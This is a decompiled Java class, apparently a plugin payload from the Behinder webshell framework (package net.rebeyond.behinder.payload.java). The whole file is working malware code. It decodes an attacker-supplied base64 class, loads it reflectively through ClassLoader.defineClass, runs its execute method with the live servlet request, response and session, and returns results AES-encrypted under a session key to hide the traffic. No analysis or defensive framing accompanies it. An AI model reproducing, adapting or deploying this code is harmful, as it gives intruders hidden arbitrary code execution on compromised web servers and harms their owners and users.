// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import java.util.Iterator;
import java.security.Key;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.HashMap;
import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class Plugin
{
    public static String taskID;
    public static String action;
    public static String payload;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    
    @Override
    public boolean equals(final Object obj) {
        final PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        page.getResponse().setCharacterEncoding("UTF-8");
        final Map<String, String> result = new HashMap<String, String>();
        if (Plugin.action.equals("submit")) {
            final ClassLoader classLoader = this.getClass().getClassLoader();
            final Class<?> urlClass = ClassLoader.class;
            try {
                final Method method = urlClass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                method.setAccessible(true);
                final byte[] payloadData = this.base64decode(Plugin.payload);
                final Class payloadCls = (Class)method.invoke(classLoader, payloadData, 0, payloadData.length);
                final Object payloadObj = payloadCls.newInstance();
                final Method payloadMethod = payloadCls.getDeclaredMethod("execute", ServletRequest.class, ServletResponse.class, HttpSession.class);
                payloadMethod.invoke(payloadObj, this.Request, this.Response, this.Session);
                result.put("msg", "\u4efb\u52a1\u63d0\u4ea4\u6210\u529f");
                result.put("status", "success");
            }
            catch (Exception e) {
                e.printStackTrace();
                result.put("msg", e.getMessage());
                result.put("status", "fail");
                try {
                    final ServletOutputStream so = this.Response.getOutputStream();
                    so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                    so.flush();
                    so.close();
                    page.getOut().clear();
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
            finally {
                try {
                    final ServletOutputStream so2 = this.Response.getOutputStream();
                    so2.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                    so2.flush();
                    so2.close();
                    page.getOut().clear();
                }
                catch (Exception e2) {
                    e2.printStackTrace();
                }
            }
        }
        else if (Plugin.action.equals("getResult")) {
            try {
                final Map<String, String> taskResult = (Map<String, String>)this.Session.getAttribute(Plugin.taskID);
                final Map<String, String> temp = new HashMap<String, String>();
                temp.put("running", taskResult.get("running"));
                temp.put("result", this.base64encode(taskResult.get("result")));
                result.put("msg", this.buildJson(temp, false));
                result.put("status", "success");
            }
            catch (Exception e3) {
                result.put("msg", e3.getMessage());
                result.put("status", "fail");
                try {
                    final ServletOutputStream so3 = this.Response.getOutputStream();
                    so3.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                    so3.flush();
                    so3.close();
                    page.getOut().clear();
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
            finally {
                try {
                    final ServletOutputStream so4 = this.Response.getOutputStream();
                    so4.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                    so4.flush();
                    so4.close();
                    page.getOut().clear();
                }
                catch (Exception e4) {
                    e4.printStackTrace();
                }
            }
        }
        return true;
    }
    
    private byte[] Encrypt(final byte[] bs) throws Exception {
        final String key = this.Session.getAttribute("u").toString();
        final byte[] raw = key.getBytes("utf-8");
        final SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        final Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        final byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    private String buildJson(final Map<String, String> entity, final boolean encode) throws Exception {
        final StringBuilder sb = new StringBuilder();
        final String version = System.getProperty("java.version");
        sb.append("{");
        for (final String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    final Class Base64 = Class.forName("java.util.Base64");
                    final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                }
                else {
                    this.getClass();
                    final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    final Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }
    
    private String base64encode(final String clearText) throws Exception {
        String result = "";
        final String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            this.getClass();
            final Class Base64 = Class.forName("java.util.Base64");
            final Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
        }
        else {
            this.getClass();
            final Class Base64 = Class.forName("sun.misc.BASE64Encoder");
            final Object Encoder = Base64.newInstance();
            result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
            result = result.replace("\n", "").replace("\r", "");
        }
        return result;
    }
    
    private byte[] base64decode(final String base64Text) throws Exception {
        final String version = System.getProperty("java.version");
        byte[] result;
        if (version.compareTo("1.9") >= 0) {
            this.getClass();
            final Class Base64 = Class.forName("java.util.Base64");
            final Object Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        }
        else {
            this.getClass();
            final Class Base64 = Class.forName("sun.misc.BASE64Decoder");
            final Object Decoder = Base64.newInstance();
            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
        }
        return result;
    }
}
